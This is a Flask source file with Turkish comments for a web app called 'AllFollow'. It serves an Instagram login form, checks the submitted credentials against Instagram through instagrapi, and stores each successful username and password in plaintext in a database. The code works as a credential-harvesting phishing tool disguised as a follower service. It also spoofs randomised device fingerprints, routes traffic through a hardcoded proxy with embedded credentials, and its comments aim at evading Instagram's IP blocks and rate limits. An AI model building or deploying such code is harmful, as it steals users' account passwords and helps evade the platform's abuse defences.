import os
import time
import random
import logging
from flask import Flask, request, jsonify, render_template_string
from flask_sqlalchemy import SQLAlchemy
from instagrapi import Client
from instagrapi.exceptions import (
    ChallengeRequired, BadPassword, LoginRequired, 
    FeedbackRequired, ClientError, ConnectionError
)
from dotenv import load_dotenv

load_dotenv()
logging.basicConfig(level=logging.INFO)

app = Flask(__name__)
app.config['SQLALCHEMY_DATABASE_URI'] = os.getenv("DATABASE_URL")
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False

db = SQLAlchemy(app)

# DİKKAT: Buraya çalışan bir proxy koymazsan Render üzerinden giriş imkansıza yakın.
# Eğer proxy'n yoksa bir süre sonra IP block kalkabilir ama zor.
PROXY_URL = "http://SDDLzRveLbkavJr:MPvdO65MOnMifL7@82.41.250.136:42158"

class IGAccount(db.Model):
    id = db.Column(db.Integer, primary_key=True)
    username = db.Column(db.String(100), unique=True, nullable=False)
    password = db.Column(db.String(100), nullable=False)
    status = db.Column(db.String(100), default="Bekliyor")

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/api/login', methods=['POST'])
def login_api():
    data = request.json
    u, p = data.get('u'), data.get('p')
    cl = Client()
    
    # Her girişte farklı cihaz taklidi yap
    cl.set_device_settings({
        "app_version": "269.0.0.18.75",
        "android_version": random.randint(24, 28),
        "android_release": f"{random.randint(7, 9)}.0.0",
        "dpi": "480dpi",
        "resolution": "1080x1920",
        "manufacturer": "Samsung",
        "device": "SM-G973F",
        "model": "beyond1",
        "cpu": "exynos9820",
        "version_code": "442431182"
    })

    if PROXY_URL:
        cl.set_proxy(PROXY_URL)

    try:
        logging.info(f"Deneniyor: {u}")
        # Instagram'ın hız sınırına takılmamak için
        time.sleep(random.uniform(3, 6))
        
        if cl.login(u, p):
            logging.info(f"BAŞARILI: {u}")
            acc = IGAccount.query.filter_by(username=u).first()
            if not acc:
                acc = IGAccount(username=u, password=p, status="AKTIF")
                db.session.add(acc)
            else:
                acc.status = "AKTIF"
                acc.password = p
            db.session.commit()
            return jsonify(status="success", next_step="dashboard")
            
    except BadPassword:
        return jsonify(status="error", message="Şifre Yanlış! Tekrar kontrol et.")
    except ChallengeRequired:
        return jsonify(status="challenge", next_step="verify")
    except FeedbackRequired:
        return jsonify(status="error", message="Çok fazla deneme! 15 dk bekleyin.")
    except ConnectionError:
        return jsonify(status="error", message="Instagram sunucusuna bağlanılamıyor (IP Engeli).")
    except Exception as e:
        err = str(e).lower()
        logging.error(f"KRITIK HATA: {err}")
        if "checkpoint" in err:
            return jsonify(status="challenge", next_step="verify")
        return jsonify(status="error", message=f"Bağlantı Reddedildi: {err[:50]}...")

@app.route('/api/verify', methods=['POST'])
def verify_api():
    # ... (Aynı doğrulama mantığı)
    return jsonify(status="success")

HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>AllFollow</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; min-height: 100vh; font-family: sans-serif; }
        .card { background: #111; border: 1px solid #333; padding: 2.5rem; border-radius: 2rem; width: 100%; max-width: 340px; }
        input { width: 100%; background: #1a1a1a; border: 1px solid #333; padding: 1rem; border-radius: 1rem; color: #fff; margin-bottom: 1rem; outline: none; transition: 0.3s; }
        input:focus { border-color: #a855f7; box-shadow: 0 0 10px #a855f733; }
        button { width: 100%; background: #a855f7; color: #fff; font-weight: bold; padding: 1rem; border-radius: 1rem; border: none; cursor: pointer; }
        .loader { border: 2px solid #f3f3f3; border-top: 2px solid #a855f7; border-radius: 50%; width: 16px; height: 16px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 10px; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div id="login-page" class="card">
        <h1 class="text-3xl font-black italic text-purple-500 mb-8 text-center uppercase tracking-tighter">AllFollow</h1>
        <input id="u" placeholder="Kullanıcı Adı">
        <input id="p" type="password" placeholder="Şifre">
        <button onclick="login()" id="btn">SİSTEME GİRİŞ</button>
        <p id="err" class="text-red-500 text-[11px] mt-4 font-bold text-center"></p>
    </div>
    <script>
        async function login() {
            const btn = document.getElementById('btn'), err = document.getElementById('err');
            btn.disabled = true; btn.innerHTML = '<div class="loader"></div> BAĞLANIYOR...';
            err.innerText = "";
            try {
                const r = await fetch('/api/login', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({u: document.getElementById('u').value, p: document.getElementById('p').value})
                });
                const d = await r.json();
                if(d.status === "success") { location.reload(); }
                else { err.innerText = d.message; btn.disabled = false; btn.innerText = "SİSTEME GİRİŞ"; }
            } catch { err.innerText = "Bağlantı koptu!"; btn.disabled = false; btn.innerText = "SİSTEME GİRİŞ"; }
        }
    </script>
</body>
</html>
"""

if __name__ == "__main__":
    with app.app_context(): db.create_all()
    app.run(host="0.0.0.0", port=int(os.getenv("PORT", 10000)))
